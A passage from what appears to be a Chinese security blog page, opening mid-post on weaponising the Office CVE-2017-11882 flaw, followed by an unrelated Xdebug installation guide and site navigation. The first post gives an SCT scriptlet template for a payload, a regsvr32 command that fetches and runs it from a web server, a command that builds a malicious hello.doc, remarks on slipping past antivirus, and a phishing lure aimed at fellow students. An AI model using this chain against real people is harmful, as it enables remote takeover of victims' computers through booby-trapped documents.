+<h3 id="四：结合web-server"><a href="#四：结合web-server" class="headerlink" title="四：结合web server"></a><a name="4"></a>四：结合web server</h3><p>&emsp;本地bypass是不够的，我们需要结合web server扩大影响。既然能够转换为 js 代码，那么我们自然会想到 sct。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration </span><br><span class="line">    progid=&quot;Msf&quot;</span><br><span class="line">    classid=&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">    //paste code here</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;保存为 msf.sct（后缀名可以更改，比如 jpg 等），这里注意，第一行一定要放在文件的第一行（第一行不能为空或其他），不然会出错，然后上传至 Web Server。</p>
+<h3 id="五：office上场"><a href="#五：office上场" class="headerlink" title="五：office上场"></a><a name="5"></a>五：office上场</h3><p>&emsp;我们需要注入：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll</span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/office1/7.png" width="700" height="400"><br></div>
+
+<p>&emsp;才80个字节，现在的exp已经支持109字节了，所以，我们可以顺利的注入进去。这里我使用<a href="https://github.com/Ridter/CVE-2017-11882。命令如下：" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882。命令如下：</a><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c "regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll" -o hello.doc</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;这里需要注意我们使用109b的脚本，不要使用43B的。<br><br>&emsp;PS：最厉害的exp已经支持605字节，已经很厉害了！！附上<br><a href="https://github.com/unamer/CVE-2017-11882/" target="_blank" rel="noopener">项目地址</a> 。这样一来姿势又多了。</p>
+<p>&emsp;把生成的文件发送给靶机，并打开该doc。</p>
+<div align="center"><br>    <img src="/images/posts/office1/8.png" width="700" height="500"><br></div><br><br><br><div align="center"><br>    <img src="/images/posts/office1/9.png" width="700" height="300"><br></div>
+
+<p>可以看到，我们又接收到一个shell，而且注意到电脑管家是全程静默的，没有任何提示及报毒。</p>
+<p>&emsp;接下来，我关掉电脑管家，启用360.。</p>
+<div align="center"><br>    <img src="/images/posts/office1/10.png" width="700" height="500"><br></div>
+
+<p>&emsp;可见360的预防效果还是强于电脑管家，但如果用户点击允许运行的话，360也不能阻止恶意的网络连接，最终还是能get shell的。</p>
+<div align="center"><br>    <img src="/images/posts/office1/11.png" width="700" height="300"><br></div>
+
+<p>&emsp;这里再安利一下卡巴斯基，老毛子的杀软，像这样的文件，老毛子会告诉你什么是残酷，我把文件从虚拟机复制出来。</p>
+<div align="center"><br>    <img src="/images/posts/office1/12.png" width="700" height="400"><br></div>
+
+<p>能活过1秒算我输。。。。    </p>
+<h3 id="六：关于钓鱼"><a href="#六：关于钓鱼" class="headerlink" title="六：关于钓鱼"></a><a name="6"></a>六：关于钓鱼</h3><div align="center"><br>    <img src="/images/posts/office1/13.png" width="700" height="400"><br></div>
+
+<p>&emsp;这模板是不是很有诱惑~ 哈哈<br><br>&emsp;画风就变成这样：同学同学，我的实验报告写完了，你要。。。不。。。要。。。借鉴一下？？（手动给个滑稽）</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-11-24T01:50:00.000Z">2017-11-24</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    4 分钟 读完 (大约 659 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/11/linux-install-xdebug/">Linux Xampp安装配置Xdebug</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;<code>Xdebug</code>是一个开源的PHP程序调试工具，可以使用它来调试、跟踪及分析程序运行状态，<code>XAMPP</code>（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包，很多PHP初学者都会使用XAMPP+Xdebug的组合。下面介绍怎样在<code>Linux xmapp</code>下安装xdebug。</p>
+<h3 id="Step-1：安装Xdebug"><a href="#Step-1：安装Xdebug" class="headerlink" title="Step 1：安装Xdebug"></a>Step 1：安装Xdebug</h3><p>&emsp;前往xdebug官网下载相应的版本，如果不知道下载什么版本，可通过官网上自动判断程序。只需新建一个php文件，内容如下：</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器中访问并把整个网页的源代码复制下来，提交到如下链接中</p>
+<div align="center"><br>    <img src="/images/posts/other/1.png" height="300" width="500"><br></div><br><br><br><div align="center"><br>    <img src="/images/posts/other/2.png" height="300" width="500"><br></div>
+
+<p>点击判断。即可得到适合的版本。</p>
+<h3 id="Step-2：解压、安装文件"><a href="#Step-2：解压、安装文件" class="headerlink" title="Step 2：解压、安装文件"></a>Step 2：解压、安装文件</h3><p>解压文件：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> tar –xzvf xdebug-2.5.4.tgz</span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> <span class="hljs-built_in">cd</span> xdebug-2.5.4/</span></span><br></pre></td></tr></table></figure></p>
+<p>安装前检索，执行phpize，这里由于每个人的路径不一，建议使用find命令查找执行。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> find / -name phpize</span></span><br></pre></td></tr></table></figure></p>
+<p>得到路径后执行，如：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> /opt/lampp/bin/phpize</span></span><br></pre></td></tr></table></figure></p>
+<p>执行时如遇如下错误需要安装autoconf解决。</p>
+<div align="center"><br>    <img src="/images/posts/other/3.png"><br></div><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> apt-get install autoconf</span></span><br></pre></td></tr></table></figure><br><br>安装完成后，重新执行<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> /opt/lampp/bin/phpize</span></span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/other/4.png" height="300" width="500"><br></div>
+
+<p>可见成功运行。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> ./configure –<span class="hljs-built_in">enable</span>-xdebug –with-php-config=/opt/lampp/bin/php-config</span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> make</span></span><br></pre></td></tr></table></figure>
+<div align="center"><br>    <img src="/images/posts/other/5.png"><br></div>
+
+<p>按提示执行<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> make  <span class="hljs-built_in">test</span></span></span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/other/6.png"><br></div>
+
+<p>接下来安装xdebug<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash">make install</span></span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/other/7.png" height="300" width="500"><br></div>
+
+<p>成功安装.</p>
+<h3 id="Step-3：配置php-ini"><a href="#Step-3：配置php-ini" class="headerlink" title="Step 3：配置php.ini"></a>Step 3：配置php.ini</h3><p>&emsp;首先找到php.ini文件，如果不知道位置可通过find找到。在xampp下是/opt/lampp/etc/php.ini</p>
+<p></p><p><br>&emsp;然后将xdebug.so路径添加进配置文件，不知道路径同样使用find查找。Xampp下是在 /opt/xdebug-2.5.4/modules/xdebug.so。在文尾添加：<br></p><br>    zend_extension=” /opt/xdebug-2.5.4/modules/xdebug.so”<p></p>
+<p>再将如下配置添加到末尾：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">;显示错误信息</span><br><span class="line">xdebug.default_enable = 1 </span><br><span class="line">;函数调试 </span><br><span class="line">xdebug.auto_trace=on </span><br><span class="line">xdebug.trace_output_dir </span><br><span class="line">xdebug.trace_output_name </span><br><span class="line">;Type: string, Default value: trace.%c </span><br><span class="line">; (参数长度，参数值，参数=值)</span><br><span class="line">xdebug.collect_params = 1|3|4</span><br><span class="line">; 显示内存</span><br><span class="line">xdebug.show_mem_delta=1 </span><br><span class="line">显示返回值</span><br><span class="line">xdebug.collect_return=1 </span><br><span class="line">; 追加日志</span><br><span class="line">xdebug.trace_options =1 </span><br><span class="line">xdebug.collect_params=1 </span><br><span class="line">xdebug.collect_vars = 1 </span><br><span class="line">;开启性能分析 </span><br><span class="line">xdebug.profiler_enable=1 </span><br><span class="line">;性能分析日志保存目录 </span><br><span class="line">xdebug.profiler_output_dir = /data/logs/xdebug/ </span><br><span class="line">;性能分析日志文件名称 </span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.log </span><br><span class="line">;默认是如下格式,t时间,p进程id </span><br><span class="line">;xdebug.profiler_output_name = cachegrind.out.%t.%p </span><br><span class="line">;代码覆盖率 </span><br><span class="line">xdebug.coverage_enable = 1 </span><br><span class="line">;以下是远程调试配置 </span><br><span class="line">xdebug.remote_host= 127.0.0.1 </span><br><span class="line">xdebug.remote_connect_back = 1 </span><br><span class="line">xdebug.remote_port = 9000 xdebug.remote_log="/data/logs/xdebug/xdebug.log"</span><br></pre></td></tr></table></figure></p>
+<h3 id="step-4：重启xampp"><a href="#step-4：重启xampp" class="headerlink" title="step 4：重启xampp"></a>step 4：重启xampp</h3><p>&emsp;此时在phpinfo页面上可以看到xdebug的信息</p>
+<div align="center"><br>    <img src="/images/posts/other/8.png"><br></div>
+
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+    
+<div class="card card-transparent">
+    <nav class="pagination is-centered" role="navigation" aria-label="pagination">
+        <div class="pagination-previous">
+            <a class="is-flex-grow has-text-black-ter" href="/page/4/">上一页</a>
+        </div>
+        <div class="pagination-next">
+            <a class="is-flex-grow has-text-black-ter" href="/page/6/">下一页</a>
+        </div>
+        <ul class="pagination-list is-hidden-mobile">
+            
+            <li><a class="pagination-link has-text-black-ter" href="/">1</a></li>
+            
+            <li><span class="pagination-ellipsis has-text-black-ter">&hellip;</span></li>
+            
+            <li><a class="pagination-link has-text-black-ter" href="/page/4/">4</a></li>
+            
+            <li><a class="pagination-link is-current" href="/page/5/">5</a></li>
+            
+            <li><a class="pagination-link has-text-black-ter" href="/page/6/">6</a></li>
+            
+        </ul>
+    </nav>
+</div>
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        56
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        18
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">27</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 10px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
